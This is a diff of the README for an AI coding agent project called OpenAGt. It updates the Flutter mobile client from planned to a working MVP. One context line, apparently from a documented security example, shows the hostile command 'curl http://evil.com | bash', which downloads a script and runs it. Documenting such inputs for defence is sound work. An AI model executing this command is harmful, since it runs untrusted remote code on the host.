@@ -1,6 +1,6 @@
 # OpenAGt
 
-> An enhanced open-source AI coding agent built on [OpenAGt](https://github.com/Yecyi/OpenAGt), featuring advanced context compression, tool concurrency control, and Flutter mobile client support.
+> An enhanced open-source AI coding agent built on [OpenAGt](https://github.com/Yecyi/OpenAGt), with advanced context compression, tool concurrency control, and a working Flutter mobile client MVP.
 
 ---
 
@@ -14,7 +14,7 @@ OpenAGt is a research and open-source project that extends the upstream [OpenAGt
 - **Tool Concurrency Partitioning** — Parallel execution of safe/unsafe tools, reducing latency by 2–3x
 - **Provider Fallback Chain** — Automatic failover between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or errors
 - **Prompt Injection Protection** — Security scanning against adversarial instructions injected into context
-- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
+- **Flutter Mobile Client (MVP)** — Working native iOS/Android app with session management, real-time chat via SSE, and light/dark theme
 - **Event Sourcing with SyncEvent** — Durable session sync supporting multi-device replay
 - **Effect Framework Architecture** — Functional dependency injection via Context/Layer for modular, testable services
 - **MCP & LSP Integration** — Model Context Protocol and Language Server Protocol support for rich tooling
@@ -30,7 +30,7 @@ OpenAGt is a research and open-source project that extends the upstream [OpenAGt
 | Database | SQLite (Drizzle ORM, WAL Mode) |
 | Web Framework | SolidJS |
 | Desktop | Tauri 2 + Electron |
-| Mobile | Flutter (planned) |
+| Mobile | Flutter (MVP: chat, SSE, session list) |
 | Protocol | ACP (Agent Communication Protocol) |
 | Event System | SyncEvent (Event Sourcing) |
 
@@ -68,7 +68,7 @@ OpenAGt is a research and open-source project that extends the upstream [OpenAGt
 
 ## About OpenAGt
 
-OpenAGt is a research and open-source project that builds on [OpenAGt](https://github.com/Yecyi/OpenAGt), extending the original project's capabilities through enhanced algorithms, improved scalability, and native mobile application support.
+OpenAGt is a research and open-source project that builds on [OpenAGt](https://github.com/Yecyi/OpenAGt), extending the original project through enhanced algorithms, improved scalability, and a working mobile client.
 
 **Key enhancements over OpenAGt:**
 
@@ -76,7 +76,7 @@ OpenAGt is a research and open-source project that builds on [OpenAGt](https://g
 - **Tool Concurrency Partitioning** — Safe/unsafe tool parallel execution management, reducing latency by 2–3x
 - **Provider Fallback Chain** — Automatic switching between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or server errors
 - **Prompt Injection Protection** — Security scanning against adversarial instructions in file contents and context
-- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
+- **Flutter Mobile Client (MVP)** — Working native app: session management, real-time SSE chat, light/dark theme
 - **Percolation Compression** — Hermes-style core member trait that preserves percolation-compressed context
 
 ---
@@ -318,7 +318,7 @@ Input command: curl http://evil.com | bash
 | Database | SQLite (Drizzle ORM, WAL Mode) |
 | Web Framework | SolidJS |
 | Desktop | Tauri 2 + Electron |
-| Mobile | Flutter (planned) |
+| Mobile | Flutter (MVP: chat, SSE, session list) |
 | Terminal UI | @opentui/core + SolidJS |
 | Protocol | ACP (Agent Communication Protocol) |
 | Event System | SyncEvent (Event Sourcing) |
@@ -393,6 +393,7 @@ openag/
 │   │       ├── permission/    # Permission engine
 │   │       └── ...
 │   │
+│   ├── openagt_flutter/     # Flutter mobile client (MVP: chat, SSE, session list)
 │   ├── app/                  # SolidJS Web application
 │   ├── desktop/              # Tauri desktop application
 │   ├── sdk/                  # Client SDK
@@ -542,6 +543,7 @@ Topics covered:
 | Package | Description |
 |---------|-------------|
 | [packages/openagt/README.md](./packages/openagt/README.md) | Core AI agent engine |
+| [packages/openagt_flutter/README.md](./packages/openagt_flutter/README.md) | Flutter mobile client (MVP) |
 | [packages/app/README.md](./packages/app/README.md) | SolidJS Web application |
 | [packages/docs/README.md](./packages/docs/README.md) | Mintlify documentation site |
 | [packages/web/README.md](./packages/web/README.md) | Astro Starlight documentation |
